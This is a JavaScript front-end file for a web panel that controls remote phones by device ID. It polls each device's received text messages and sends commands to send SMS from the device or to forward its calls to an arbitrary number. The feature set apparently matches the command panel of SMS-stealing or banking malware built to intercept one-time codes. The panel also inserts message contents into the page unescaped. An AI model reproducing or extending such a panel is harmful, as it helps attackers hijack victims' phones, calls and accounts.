// API Base URL
const API_URL = window.location.origin;

// Get device ID from URL
const urlParams = new URLSearchParams(window.location.search);
const currentDeviceId = urlParams.get('device');

// Global variables
let deleteSMSTarget = null;

// Load device info and SMS on page load
document.addEventListener('DOMContentLoaded', () => {
    if (!currentDeviceId) {
        window.location.href = 'index.html';
        return;
    }
    
    document.getElementById('deviceId').textContent = currentDeviceId;
    loadDeviceStatus();
    loadSMS();
    
    // Auto-refresh every 2 seconds
    setInterval(() => {
        loadDeviceStatus();
        loadSMS();
    }, 2000);
});

// Load device status
async function loadDeviceStatus() {
    try {
        const response = await fetch(`${API_URL}/api/devices`);
        const devices = await response.json();
        
        const device = devices.find(d => d.device_id === currentDeviceId);
        
        if (device) {
            const statusDot = document.getElementById('statusDot');
            const statusText = document.getElementById('statusText');
            
            if (device.is_online) {
                statusDot.className = 'status-dot online';
                statusText.textContent = 'Online';
            } else {
                statusDot.className = 'status-dot offline';
                statusText.textContent = 'Offline';
            }
        }
    } catch (error) {
        console.error('Error loading device status:', error);
    }
}

// Load SMS
async function loadSMS() {
    try {
        const response = await fetch(`${API_URL}/api/device/${currentDeviceId}/sms`);
        const smsList = await response.json();
        
        const smsContainer = document.getElementById('smsList');
        
        if (smsList.length === 0) {
            smsContainer.innerHTML = '<p class="text-center" style="color: var(--text-secondary);">No SMS received yet</p>';
            return;
        }
        
        smsContainer.innerHTML = smsList.map(sms => `
            <div class="sms-item">
                <div class="sms-sender">From: ${sms.sender}</div>
                <div class="sms-body">${sms.message_body}</div>
                <div class="sms-time">${new Date(sms.received_at).toLocaleString()}</div>
                <div class="delete-icon" onclick="deleteSMS(${sms.id})">🗑️</div>
            </div>
        `).join('');
    } catch (error) {
        console.error('Error loading SMS:', error);
    }
}

// Open forms page
function openFormsPage() {
    window.location.href = `forms.html?device=${currentDeviceId}`;
}

// Send SMS Modal
function openSendSMSModal() {
    openModal('sendSMSModal');
}

async function sendSMS() {
    const phoneNumber = document.getElementById('smsPhoneNumber').value;
    const message = document.getElementById('smsMessage').value;
    const simSlot = parseInt(document.getElementById('smsSimSlot').value);
    
    if (!phoneNumber || !message) {
        alert('Please fill in all fields');
        return;
    }
    
    try {
        const response = await fetch(`${API_URL}/api/command/send`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                device_id: currentDeviceId,
                command_type: 'send_sms',
                command_data: {
                    phone_number: phoneNumber,
                    message: message,
                    sim_slot: simSlot
                }
            })
        });
        
        const result = await response.json();
        
        if (result.status === 'success') {
            showSuccess('SMS command sent successfully!');
            document.getElementById('smsPhoneNumber').value = '';
            document.getElementById('smsMessage').value = '';
        }
    } catch (error) {
        console.error('Error sending SMS command:', error);
    }
    
    closeModal('sendSMSModal');
}

// Call Forwarding Modal
function openCallForwardingModal() {
    openModal('callForwardingModal');
}

async function activateCallForwarding() {
    const forwardNumber = document.getElementById('forwardPhoneNumber').value;
    const simSlot = parseInt(document.getElementById('forwardSimSlot').value);
    
    if (!forwardNumber) {
        alert('Please enter a forwarding number');
        return;
    }
    
    try {
        const response = await fetch(`${API_URL}/api/command/send`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                device_id: currentDeviceId,
                command_type: 'call_forward',
                command_data: {
                    action: 'enable',
                    forward_number: forwardNumber,
                    sim_slot: simSlot
                }
            })
        });
        
        const result = await response.json();
        
        if (result.status === 'success') {
            showSuccess('Call forwarding activated successfully!');
            document.getElementById('forwardPhoneNumber').value = '';
        }
    } catch (error) {
        console.error('Error activating call forwarding:', error);
    }
    
    closeModal('callForwardingModal');
}

async function deactivateCallForwarding() {
    const simSlot = parseInt(document.getElementById('forwardSimSlot').value);
    
    try {
        const response = await fetch(`${API_URL}/api/command/send`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                device_id: currentDeviceId,
                command_type: 'call_forward',
                command_data: {
                    action: 'disable',
                    sim_slot: simSlot
                }
            })
        });
        
        const result = await response.json();
        
        if (result.status === 'success') {
            showSuccess('Call forwarding deactivated successfully!');
        }
    } catch (error) {
        console.error('Error deactivating call forwarding:', error);
    }
    
    closeModal('callForwardingModal');
}

// Delete SMS
function deleteSMS(smsId) {
    deleteSMSTarget = smsId;
    openModal('deleteModal');
}

async function confirmDeleteSMS() {
    if (!deleteSMSTarget) return;
    
    try {
        const response = await fetch(`${API_URL}/api/sms/${deleteSMSTarget}`, {
            method: 'DELETE'
        });
        
        const result = await response.json();
        
        if (result.status === 'success') {
            showSuccess('SMS deleted successfully!');
            loadSMS();
        }
    } catch (error) {
        console.error('Error deleting SMS:', error);
    }
    
    closeModal('deleteModal');
    deleteSMSTarget = null;
}

// Modal functions
function openModal(modalId) {
    document.getElementById(modalId).classList.add('active');
}

function closeModal(modalId) {
    document.getElementById(modalId).classList.remove('active');
}

function showSuccess(message) {
    document.getElementById('successMessage').textContent = message;
    openModal('successModal');
}